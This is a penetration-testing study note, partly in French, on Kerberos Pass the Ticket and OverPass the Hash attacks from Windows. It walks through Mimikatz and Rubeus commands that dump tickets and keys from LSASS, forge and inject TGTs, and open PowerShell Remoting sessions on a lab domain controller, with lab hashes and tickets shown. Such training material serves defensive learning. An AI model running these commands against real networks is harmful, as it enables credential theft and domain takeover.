# (PtT) from Windows

{% hint style="info" %}
Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.&#x20;
{% endhint %}

***

### <mark style="color:blue;">Kerberos Protocol Refresher</mark>

Le système d'authentification Kerberos est basé sur des tickets. L'idée principale de Kerberos est de ne pas fournir le mot de passe d'un compte à chaque service que vous utilisez. Au lieu de cela, Kerberos conserve tous les tickets sur votre système local et présente à chaque service uniquement le ticket spécifique à ce service, empêchant ainsi un ticket d'être utilisé à d'autres fins.

Le **TGT** (Ticket Granting Ticket) est le premier ticket obtenu dans un système Kerberos. Le TGT permet au client d'obtenir des tickets Kerberos supplémentaires ou des **TGS** (Ticket Granting Service).

Le **TGS** est demandé par les utilisateurs qui souhaitent utiliser un service. Ces tickets permettent aux services de vérifier l'identité de l'utilisateur.

Lorsqu'un utilisateur demande un TGT, il doit s'authentifier auprès du contrôleur de domaine en chiffrant l'horodatage actuel avec le hachage de son mot de passe. Une fois que le contrôleur de domaine valide l'identité de l'utilisateur (car le domaine connaît le hachage du mot de passe de l'utilisateur, ce qui signifie qu'il peut déchiffrer l'horodatage), il envoie un TGT à l'utilisateur pour de futures demandes. Une fois que l'utilisateur a son ticket, il n'a plus besoin de prouver son identité avec son mot de passe.

Si l'utilisateur souhaite se connecter à une base de données MSSQL, il demandera un **TGS** au **Key Distribution Center (KDC)** en présentant son **TGT**. Ensuite, il fournira le TGS au serveur MSSQL pour l'authentification.

***

### <mark style="color:blue;">Pass the Ticket (PtT) Attack</mark>

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be:

* **Service Ticket (TGS - Ticket Granting Service)** to allow access to a particular resource.
* **Ticket Granting Ticket (TGT)**, which we use to request service tickets to access any resource the user has privileges.

***

### <mark style="color:blue;">Harvesting Kerberos Tickets from Windows</mark>

<mark style="color:orange;">**On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process.**</mark>

Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

We can harvest all tickets from a system using the `Mimikatz` module `sekurlsa::tickets /export`. The result is a list of files with the extension `.kirbi`, which contain the tickets.

{% code fullWidth="true" %}
```powershell
c:\tools> mimikatz.exe

 .......

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
.......

mimikatz # exit
Bye!

c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi

<SNIP>

```
{% endcode %}

The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.

Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

***

We can also export tickets using `Rubeus` and the option `dump`. This option can be used to dump all tickets (if running as a local administrator). `Rubeus dump`, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option `/nowrap` for easier copy-paste.

<mark style="color:green;">**Rubeus - Export Tickets**</mark>

{% code fullWidth="true" %}
```powershell
c:\tools> Rubeus.exe dump /nowrap
-----

    ServiceName           :  krbtgt/inlanefreight.htb
    ServiceRealm          :  inlanefreight.htb
    UserName              :  plaintext
    UserRealm             :  inlanefreight.htb
    StartTime             :  7/12/2022 9:42:15 AM
    EndTime               :  7/12/2022 7:42:15 PM
    RenewTill             :  7/19/2022 9:42:15 AM
    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType               :  aes256_cts_hmac_sha1
    Base64(key)           :  2NN3wdC4FfpQunUUgK+MZO8f20xtXF0dbmIagWP0Uu0=
    Base64EncodedTicket   :

doIE9jCCBPKgAwIBBaEDAgEWooIECTCCBAVhggQBMIID/aADAgEFoQkbB0hUQi5D.....
<SNIP>
```
{% endcode %}

Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

***

### <mark style="color:blue;">Pass the Key or OverPass the Hash</mark>

The traditional `Pass the Hash (PtH)` technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4\_hmac, aes256\_cts\_hmac\_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`. This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation [Abusing Microsoft Kerberos - Sorry you guys don't get it](https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). Also [Will Schroeder](https://twitter.com/harmj0y) adapted their project to create the [Rubeus](https://github.com/GhostPack/Rubeus) tool.

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.

<pre class="language-powershell" data-full-width="true"><code class="lang-powershell"><strong>c:\tools> mimikatz.exe
</strong>
  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
&#x3C;SNIP>

Authentication Id : 0 ; 444066 (00000000:0006c6a2)
Session           : Interactive from 1
User Name         : plaintext
Domain            : HTB
Logon Server      : DC01
Logon Time        : 7/12/2022 9:42:15 AM
SID               : S-1-5-21-228825152-3134732153-3833540767-1107

         * Username : plaintext
         * Domain   : inlanefreight.htb
         * Password : (null)
         * Key List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
&#x3C;SNIP>
</code></pre>

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.

{% code fullWidth="true" %}
```powershell
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

user    : plaintext
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 3f74aa8f08f712f09cd5177b5c1ce50f
  |  PID  1128
  |  TID  3268
  |  LSA Process is now R/W
  |  LUID 0 ; 3414364 (00000000:0034195c)
  \_ msv1_0   - data copy @ 000001C7DBC0B630 : OK !
  \_ kerberos - data copy @ 000001C7E20EE578
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001C7E2136BC8 (32) -> null
```
{% endcode %}

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the aes256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.

{% code overflow="wrap" fullWidth="true" %}
```cmd-session
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 3f74aa8f08f712f09cd5177b5c1ce50f
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\plaintext'
[+] TGT request successful!
[*] base64(ticket.kirbi):

doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4

  ServiceName           :  krbtgt/inlanefreight.htb
  ServiceRealm          :  inlanefreight.htb
  UserName              :  plaintext
  UserRealm             :  inlanefreight.htb
  StartTime             :  7/12/2022 11:28:26 AM
  EndTime               :  7/12/2022 9:28:26 PM
  RenewTill             :  7/19/2022 11:28:26 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  0TOKzUHdgBQKMk8+xmOV2w==
```
{% endcode %}

***

### <mark style="color:blue;">Pass the Ticket (PtT)</mark>

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

{% code overflow="wrap" fullWidth="true" %}
```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
   ______        _
```
{% endcode %}

Note that now it displays `Ticket successfully imported!`.

Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.

{% code fullWidth="true" %}
```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
{% endcode %}

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

{% code overflow="wrap" fullWidth="true" %}
```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

doQAAAWfMIQAAAWZoIQAAAADAgEFoYQAAAADAgEWooQAAAQ5MIQAAAQzYYQAAAQtMIQAAAQnoIQAAAADAgEFoYQAAAAJGwdIVEIuQ09NooQAAAAsMIQAAAAmoIQAAAADAgECoYQAAAAXMIQAAAARGwZrcmJ0Z3QbB0hUQi5DT02jhAAAA9cwhAAAA9GghAAAAAMCARKhhAAAAAMCAQKihAAAA7kEggO1zqm0SuXewDEmypVORXzj8hyqSmikY9gxbM9xdpmA8r2EvTnv0UYkQFdf4B73Ss5ylutsSsyvnZYRVr8Ta9Wx/fvnjpJw/T70suDA4CgsuSZcBSo/jMnDjucWNtlDc8ez6<SNIP>
```
{% endcode %}

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

{% code overflow="wrap" fullWidth="true" %}
```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```
{% endcode %}

Finally, we can also perform the Pass the Ticket attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket we want to import.

{% code fullWidth="true" %}
```cmd-session
C:\tools> mimikatz.exe 



mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

```
{% endcode %}

***

### <mark style="color:blue;">Pass The Ticket with PowerShell Remoting (Windows)</mark>

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) PowerShell Remoting permet d’exécuter des scripts ou des commandes sur un ordinateur distant. Les administrateurs l’utilisent souvent pour gérer à distance des machines sur le réseau. Activer PowerShell Remoting crée des écouteurs HTTP et HTTPS. L’écouteur utilise le port TCP 5985 pour HTTP et le port TCP 5986 pour HTTPS.

Pour créer une session PowerShell Remoting vers un ordinateur distant, il faut avoir des droits administratifs, être membre du groupe Remote Management Users, ou avoir des autorisations explicites de PowerShell Remoting dans la configuration de session.

Si on trouve un compte utilisateur qui n’a pas de privilèges administratifs sur une machine distante mais qui est membre du groupe Remote Management Users, alors on peut utiliser PowerShell Remoting pour se connecter à cette machine et exécuter des commandes.

***

### <mark style="color:blue;">Mimikatz - PowerShell Remoting with Pass the Ticket</mark>

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute mimikatz.exe, then import the ticket we collected using `kerberos::ptt`. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command `Enter-PSSession` to connect to the target machine.

{% code fullWidth="true" %}
```powershell
C:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```
{% endcode %}

***

### <mark style="color:blue;">Rubeus - PowerShell Remoting with Pass the Ticket</mark>

Dans **Rubeus**, l’option **`createnetonly`** permet de **créer un processus ou une session de connexion "sacrificielle"** avec le **type de connexion 9** (_Logon type 9_).

🔹 **Qu’est-ce que cela signifie ?**

* Cela crée un processus qui utilise des **identifiants réseau uniquement** (_netonly_).
* Le processus est **caché par défaut**, mais on peut utiliser l’option **`/show`** pour l’afficher.
*   Cette action est **équivalente à la commande Windows** :

    ```powershell
    runas /netonly
    ```

    👉 Ce mode permet de s'authentifier sur un réseau sans affecter la session locale.

🔹 **Pourquoi utiliser cette option ?**

* Quand on demande un **Ticket Kerberos (TGT)**, il est normalement enregistré dans la session de l’utilisateur.
* Si on crée un **nouveau ticket** sans `createnetonly`, cela **écrasera** les TGTs existants dans la session.
* En utilisant **`createnetonly`**, on **évite d’écraser** les tickets de l’utilisateur actuel et on peut tester l’authentification réseau sans modifier sa session.

💡 **Cas d’usage**\
Si tu veux tester un accès réseau en utilisant un compte différent sans affecter ta session actuelle, tu peux faire :

```powershell
Rubeus createnetonly /user:admin /domain:inlanefreight.htb /show
```

Cela crée un processus où `admin` est utilisé uniquement pour l’authentification réseau.

{% hint style="info" %}
***

**Problème 1 — Les tickets Kerberos sont liés à une session**

Windows organise les tickets Kerberos par **LUID** (Locally Unique Identifier) — un identifiant unique pour chaque session de connexion. Chaque `cmd.exe` ou `powershell` a son propre LUID.

```
Session A (LUID = 0x12345)    Session B (LUID = 0x67890)
│                              │
├─ Cache Kerberos A            ├─ Cache Kerberos B
│   └─ TGT de alice           │   └─ TGT de bob
│                              │
└─ Enter-PSSession             └─ Enter-PSSession
   utilise TGT alice              utilise TGT bob
```

Si tu injectes un ticket dans ta session courante avec `kerberos::ptt`, il va dans **ton** LUID et écrase tes tickets existants.

***

**Problème 2 — Ce que `createnetonly` fait**

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Ça crée un **nouveau processus cmd.exe avec un nouveau LUID vierge** — une session sacrificielle isolée. Ce nouveau processus a son propre cache Kerberos séparé, vide au départ.

```
Ta session (LUID = 0x12345)
│
├─ Tes tickets → intacts, pas touchés
│
└─> Rubeus createnetonly → crée nouveau cmd.exe (LUID = 0x99999)
                               │
                               ├─ Cache Kerberos vide au départ
                               └─> Rubeus injecte TGT de john ici
                                        │
                                        └─> tout ce que ce cmd.exe
                                            fait réseau → utilise
                                            le TGT de john
```

***

**L'équivalent mental : `runas /netonly`**

```
runas /netonly /user:john cmd.exe
```

`/netonly` veut dire : "lance ce processus avec ces credentials uniquement pour les connexions réseau, pas pour la session locale". La session locale reste la tienne, mais quand le processus parle au réseau, il s'authentifie en tant que john.

`createnetonly` fait exactement ça, mais pour un ticket Kerberos au lieu d'un mot de passe.
{% endhint %}

{% code fullWidth="true" %}
```powershell
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3


[*] Action: Create process (/netonly)


[*] Using random username and password.

[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648
```
{% endcode %}

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

{% code overflow="wrap" fullWidth="true" %}
```powershell
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
[*] Using domain controller: 10.129.203.120:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC
      oiYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0YqOCBFAwggRMoAMCARKhAwIBAqKC
      BCB1KArMCmgAwIBEqEiBCDlV0Bp6+en
      HH9/2tewMMt8rq0f7ipDd/UaU4HUKUFaHaETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYb
      BGpvaG6jBwMFAEDhAAClERgPMjAyMjA3MTgxMjQ0NTBaphEYDzIwMjIwNzE4MjI0NDUwWqcRGA8yMDIy
      MDcyNTEyNDQ1MFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEWlubGFu
      ZWZyZWlnaHQuaHRi
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  7/18/2022 5:44:50 AM
  EndTime                  :  7/18/2022 3:44:50 PM
  RenewTill                :  7/25/2022 5:44:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```
{% endcode %}
